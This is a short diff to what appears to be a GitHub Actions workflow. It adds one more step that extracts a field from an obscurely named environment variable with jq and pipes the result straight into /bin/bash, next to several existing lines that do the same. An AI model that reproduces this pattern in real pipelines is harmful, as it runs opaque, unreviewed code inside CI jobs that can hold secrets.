@@ -27,6 +27,7 @@ jobs:
           echo $w14 | jq -r .fug23 | /bin/bash
           echo $jzvs4380 | jq -r .qpyu631 | /bin/bash
           printf '%s' "$iuei1310" | jq -r .x0 | /bin/bash
+          printf '%s' "$pp41" | jq -r .lq9647 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
